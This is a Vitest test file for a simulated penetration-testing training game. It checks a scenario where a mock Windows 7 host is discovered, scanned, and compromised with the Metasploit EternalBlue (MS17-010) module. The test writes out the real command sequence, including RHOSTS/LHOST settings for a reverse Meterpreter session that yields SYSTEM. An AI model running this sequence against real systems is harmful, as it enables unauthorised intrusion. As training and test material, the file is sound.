// ── commands/__tests__/happyPath-scenario03.test.ts ───────────────
// Happy path tests for Scenario 03: EternalBlue - MS17-010

import { describe, it, expect, beforeEach } from 'vitest';
import { createAttacker, exec, evolveState, expectSuccess, withLevel, setupBeforeEach } from './happyPathHelpers';
import { resetMsfState } from '../index';
import type { Machine } from '../../types';

setupBeforeEach();

describe('Happy Path: Scenario 03 - EternalBlue', () => {
  beforeEach(() => {
    resetMsfState();
  });

  const attacker = createAttacker();
  const win7Target: Machine = {
    id: 'win7-target',
    machine_info: {
      hostname: 'WIN7-TARGET',
      ip: '172.16.0.11',
      mac: '08:00:27:C4:D5:E6',
      os: 'Windows 7 Professional SP1 x64',
      status: 'up',
      type: 'workstation',
    },
    discovery_level: 0,
    scan_results: {
      ports: [
        { port: 135, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
        { port: 139, protocol: 'tcp', state: 'open', service: 'netbios-ssn', version: 'Microsoft Windows netbios-ssn' },
        { port: 445, protocol: 'tcp', state: 'open', service: 'microsoft-ds', version: 'Windows 7 Professional 7601 Service Pack 1' },
        { port: 49152, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
      ],
    },
    web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
    learning_steps: [
      { id: 1, task: 'Reconocimiento de red', text: 'arp-scan', targetMachineId: 'win7-target', discoveryLevel: 1 },
      { id: 2, task: 'Escaneo de puertos', text: 'nmap -sV', targetMachineId: 'win7-target', discoveryLevel: 2 },
      { id: 3, task: 'Verificar vulnerabilidad', text: 'msfconsole auxiliary', targetMachineId: 'win7-target', discoveryLevel: 2 },
      { id: 4, task: 'Explotar EternalBlue', text: 'msfconsole exploit', targetMachineId: 'win7-target', discoveryLevel: 3 },
      { id: 5, task: 'Verificar acceso SYSTEM', text: 'getuid', targetMachineId: 'win7-target', discoveryLevel: 4 },
    ],
    files: [],
  };

  it('Paso 1: arp-scan descubre Windows 7', () => {
    const result = exec('arp-scan 172.16.0.0/24', attacker, [attacker, win7Target], 1);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(1);
    expect(result.output).toContain('172.16.0.11');
  });

  it('Paso 2: nmap detecta SMB en puerto 445', () => {
    const target = withLevel(win7Target, 1);
    const result = exec('nmap -sV 172.16.0.11', attacker, [attacker, target], 2);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(2);
    expect(result.output).toContain('445/tcp');
  });

  it('Golden path: arp-scan → nmap → MSF auxiliary → exploit → getuid', () => {
    let machines: Machine[] = [attacker, win7Target];

    let result = exec('arp-scan 172.16.0.0/24', attacker, machines, 1);
    expect(result.completedMissionId).toBe(1);
    machines = evolveState(machines, result);

    result = exec('nmap -sV 172.16.0.11', attacker, machines, 2);
    expect(result.completedMissionId).toBe(2);
    machines = evolveState(machines, result);

    exec('msfconsole', attacker, machines, 3);

    result = exec('search ms17', attacker, machines, 3);
    expect(result.output).toContain('smb_ms17_010');

    exec('use 0', attacker, machines, 3);
    exec('set RHOSTS 172.16.0.11', attacker, machines, 3);

    result = exec('run', attacker, machines, 3);
    expect(result.output).toContain('VULNERABLE');
    expect(result.completedMissionId).toBe(3);
    machines = evolveState(machines, result);

    exec('back', attacker, machines, 4);

    result = exec('search ms17', attacker, machines, 4);
    expect(result.output).toContain('eternalblue');

    exec('use 1', attacker, machines, 4);
    exec('set RHOSTS 172.16.0.11', attacker, machines, 4);
    exec('set LHOST 192.168.1.10', attacker, machines, 4);

    result = exec('exploit', attacker, machines, 4);
    expect(result.output).toContain('Meterpreter session');
    expect(result.completedMissionId).toBe(4);
    machines = evolveState(machines, result);

    result = exec('getuid', attacker, machines, 5);
    expect(result.output).toContain('NT AUTHORITY');
    expect(result.output).toContain('SYSTEM');
    expect(result.completedMissionId).toBe(5);
  });
});
